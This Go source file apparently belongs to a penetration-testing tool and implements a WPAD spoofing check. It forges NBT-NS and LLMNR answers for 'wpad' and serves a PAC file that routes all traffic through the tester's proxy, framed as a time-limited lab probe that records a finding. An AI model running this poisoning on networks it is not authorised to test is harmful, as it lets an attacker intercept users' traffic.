// WPAD sends NBT-NS and LLMNR answers for the wpad name and briefly serves
// a PAC from a listener the runner supplies. The HTTP handler does not
// capture authentication exchanges or forward proxy traffic.

package routing

import (
	"context"
	"encoding/json"
	"io"
	"net"
	"net/http"
	"strconv"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/common/spawn"
	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/catalog"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	nl "go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

// wpadPacTTL is the decay bound: clients re-fetch the PAC after this TTL.
const wpadPacTTL = 30 // seconds

// wpadFinding is the finding detail for the WPAD behavior.
type wpadFinding struct {
	Action string `json:"action"`
	Query  string `json:"query"`
	Answer string `json:"answer"`
	TTL    int    `json:"ttl"`
	Port   int    `json:"port"`
}

// wpadState holds the embedded proxy's runtime state.
type wpadState struct {
	listener net.Listener
	port     int
	server   *http.Server
}

// RunWPAD announces the attack leg's own IPv4 as wpad over NBT-NS and
// LLMNR, then serves a TTL-bound PAC from a listener opened through
// deps.Listen and closed before return. The name and the transaction IDs
// are probe content, and the behavior reads no target. The verdict is pending:
// whether a client fetched the PAC needs the listener's request log it does
// not have. A bind failure carries [catalog.ErrCodeWPADPortCollision].
// Concurrent calls require separate dependencies.
func RunWPAD(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	addr := deps.AttackLeg.Addr()
	qname := "wpad"
	answerIP := addr.IPv4

	state, err := startWPADProxy(ctx, deps.Listen)
	if err != nil {
		// Port collision: named coded error, not a crash.
		return check.Verdict{}, errs.New().
			Code(catalog.ErrCodeWPADPortCollision).
			UserMsg("WPAD proxy port collision").
			Hint("free the port or let the OS choose").
			Msgf("wpad: bind proxy listener: %v", err)
	}
	defer func() {
		_ = state.server.Close()
		_ = state.listener.Close()
	}()

	nbnsPkt, err := craftNBTNSResponse(addr.MAC, qname, answerIP)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "wpad: craft nbt-ns")
	}
	if err := deps.AttackLeg.Send(ctx, nbnsPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "wpad: send nbt-ns")
	}

	llmnrPkt, err := craftLLMNRResponse(addr.MAC, qname, answerIP)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "wpad: craft llmnr")
	}
	if err := deps.AttackLeg.Send(ctx, llmnrPkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "wpad: send llmnr")
	}

	// Emit the finding.
	detail := wpadFinding{
		Action: "wpad-rogue-proxy",
		Query:  qname,
		Answer: answerIP.String(),
		TTL:    wpadPacTTL,
		Port:   state.port,
	}
	detailBytes, _ := json.Marshal(detail)
	deps.Emitter.Finding("wpad", detailBytes)

	return check.Pending("no observable: PAC fetch needs the listener's request log"), nil
}

// startWPADProxy starts an embedded HTTP server on a listener from listen
// serving a TTL-bound PAC response. The PAC redirects all traffic to the
// attacker. ctx bounds only the goroutine that serves the listener, so a
// panic there is reported with the caller's trace correlation, and the server
// itself is stopped by closing state.server and state.listener, not by ctx.
func startWPADProxy(ctx context.Context, listen func(context.Context, string, string) (net.Listener, error)) (*wpadState, error) {
	// Bind on a free port (port 0 = OS-chosen).
	ln, err := listen(ctx, "tcp", "127.0.0.1:0")
	if err != nil {
		return nil, err
	}
	port := 0
	if tcp, ok := ln.Addr().(*net.TCPAddr); ok {
		port = tcp.Port
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/wpad.dat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/x-ns-proxy-autoconfig")
		w.Header().Set("Cache-Control", "max-age="+strconv.Itoa(wpadPacTTL))
		// PAC: direct to attacker proxy for all destinations.
		pac := `function FindProxyForURL(url, host) { return "PROXY ` + r.Host + `"; }`
		_, _ = io.WriteString(w, pac)
	})

	srv := &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 5 * time.Second,
		// The PAC body is a handful of bytes, and anything longer than these
		// bounds is a stuck or hostile client draining the lab operator's
		// process, so bound both directions.
		WriteTimeout: 10 * time.Second,
		IdleTimeout:  30 * time.Second,
	}

	spawn.Go(ctx, "netpen wpad proxy serve", func() {
		_ = srv.Serve(ln) //nolint:errcheck // shutdown via Close
	})

	return &wpadState{listener: ln, port: port, server: srv}, nil
}

// craftNBTNSResponse builds an NBT-NS response: Ethernet → IPv4 →
// UDP(137) → NBNS response with the attacker's IP as the answer for
// "wpad". Uses the owned [nl.NBNS] layer.
func craftNBTNSResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
	nbns := &nl.NBNS{
		ID:      0x1234,
		Flags:   0x8500, // response, authoritative
		QDCount: 0,
		ANCount: 1,
		Answers: []nl.NBNSResourceRecord{
			{
				Name:  qname,
				Type:  0x0020, // NB type
				Class: 0x0001, // IN
				TTL:   wpadPacTTL,
				Data:  nbnsNodeAddress(answerIP),
			},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       broadcastMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    net.IPv4(255, 255, 255, 255),
	}
	udp := &layers.UDP{
		SrcPort: 137,
		DstPort: 137,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, nbns)
}

// nbnsNodeAddress builds the NBNS RDATA for a node status response: a
// 6-byte value (flags + IP address). See RFC 1002 §4.2.1.2.
func nbnsNodeAddress(ip net.IP) []byte {
	data := make([]byte, 6)
	data[0] = 0x00 // flags
	ip4 := ip.To4()
	copy(data[2:6], ip4)
	return data
}

// craftLLMNRResponse builds an LLMNR response: Ethernet → IPv4 →
// UDP(5355) → LLMNR response with the attacker's IP as the answer for
// "wpad". Uses the owned [nl.LLMNR] layer.
func craftLLMNRResponse(src net.HardwareAddr, qname string, answerIP net.IP) ([]byte, error) {
	llmnr := &nl.LLMNR{
		ID:      0x5678,
		Flags:   0x8000, // response
		QDCount: 0,
		ANCount: 1,
		Answers: []nl.LLMNRResourceRecord{
			{
				Name:  qname,
				Type:  1, // A record
				Class: 1, // IN
				TTL:   wpadPacTTL,
				Data:  answerIP.To4(),
			},
		},
	}

	eth := &layers.Ethernet{
		SrcMAC:       src,
		DstMAC:       src, // link-local; in tests the fixture MAC
		EthernetType: layers.EthernetTypeIPv4,
	}
	ip := &layers.IPv4{
		Version:  4,
		IHL:      5,
		TTL:      1,
		Protocol: layers.IPProtocolUDP,
		SrcIP:    answerIP,
		DstIP:    net.IPv4(224, 0, 0, 252), // LLMNR multicast
	}
	udp := &layers.UDP{
		SrcPort: 5355,
		DstPort: 5355,
	}
	_ = udp.SetNetworkLayerForChecksum(ip)
	return craft.Default(eth, ip, udp, llmnr)
}

// Compile-time assertions: the owned layers implement SerializableLayer.
var (
	_ gopacket.SerializableLayer = (*nl.NBNS)(nil)
	_ gopacket.SerializableLayer = (*nl.LLMNR)(nil)
)
